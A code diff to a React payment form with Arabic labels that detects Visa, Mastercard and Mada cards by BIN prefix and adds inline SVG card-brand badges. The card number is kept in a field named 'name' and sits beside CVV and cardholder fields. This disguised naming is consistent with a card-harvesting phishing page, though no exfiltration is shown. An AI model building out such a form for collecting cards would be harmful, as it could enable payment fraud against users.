@@ -4,6 +4,7 @@ import { useState } from "react";
 import { useRouter } from "next/navigation";
 import Image from "next/image";
 import { FaWifi } from "react-icons/fa";
+import cardValidator from "card-validator";
 
 interface PaymentFormProps {
   onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<void>;
@@ -19,13 +20,15 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
   const [loading, setLoading] = useState(false);
   const [flipped, setFlipped] = useState(false);
 
-  const MADA_BINS = ["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"];
+  const MADA_BINS = new Set(["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"]);
 
   const getCardType = (num: string): "Visa" | "Mastercard" | "Mada" | null => {
     if (!num) return null;
-    if (num.length >= 6 && MADA_BINS.includes(num.slice(0, 6))) return "Mada";
-    if (/^4/.test(num)) return "Visa";
-    if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "Mastercard";
+    if (num.length >= 6 && MADA_BINS.has(num.slice(0, 6))) return "Mada";
+    const { card } = cardValidator.number(num);
+    if (!card) return null;
+    if (card.type === "visa") return "Visa";
+    if (card.type === "mastercard") return "Mastercard";
     return null;
   };
 
@@ -167,9 +170,8 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
       </div>
 
       <div className="bg-white border border-gray-200 rounded-2xl overflow-hidden p-4 sm:p-6">
-        <div className="flex justify-start items-center gap-3 mb-4">
-          <Image src="/mada975b.png" alt="Mada" width={60} height={60} className="object-contain sm:w-[80px] sm:h-[80px]" />
-          <Image src="/cc975b.png" alt="Visa" width={60} height={60} className="object-contain sm:w-[80px] sm:h-[80px]" />
+        <div className="flex justify-start items-center mb-4">
+          <Image src="/فيزا ماستر مدى.webp" alt="Visa Mastercard Mada" width={120} height={40} className="object-contain" />
         </div>
         <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
           <div className="sm:col-span-2">
@@ -187,8 +189,27 @@ export default function PaymentForm({ onSubmit }: PaymentFormProps) {
                 className={`${inputClass("name")} pr-16`}
               />
               {fields.name.replace(/\s/g, "").length >= 1 && (
-                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-gray-500">
-                  {getCardType(fields.name.replace(/\s/g, "")) ?? "غير معروف"}
+                <span className="absolute left-3 top-1/2 -translate-y-1/2">
+                  {cardType === "Visa" && (
+                    <svg viewBox="0 0 48 16" width="48" height="16" xmlns="http://www.w3.org/2000/svg">
+                      <rect width="48" height="16" rx="3" fill="#1A1F71"/>
+                      <text x="24" y="12" textAnchor="middle" fill="white" fontSize="11" fontWeight="bold" fontFamily="Arial">VISA</text>
+                    </svg>
+                  )}
+                  {cardType === "Mastercard" && (
+                    <svg viewBox="0 0 48 30" width="40" height="25" xmlns="http://www.w3.org/2000/svg">
+                      <circle cx="18" cy="15" r="12" fill="#EB001B"/>
+                      <circle cx="30" cy="15" r="12" fill="#F79E1B"/>
+                      <path d="M24 6.27a12 12 0 0 1 0 17.46A12 12 0 0 1 24 6.27z" fill="#FF5F00"/>
+                    </svg>
+                  )}
+                  {cardType === "Mada" && (
+                    <svg viewBox="0 0 48 20" width="48" height="20" xmlns="http://www.w3.org/2000/svg">
+                      <rect width="48" height="20" rx="3" fill="#4CAF50"/>
+                      <text x="24" y="14" textAnchor="middle" fill="white" fontSize="10" fontWeight="bold" fontFamily="Arial">mada</text>
+                    </svg>
+                  )}
+                  {!cardType && <span className="text-xs font-semibold text-gray-400">غير معروف</span>}
                 </span>
               )}
             </div>
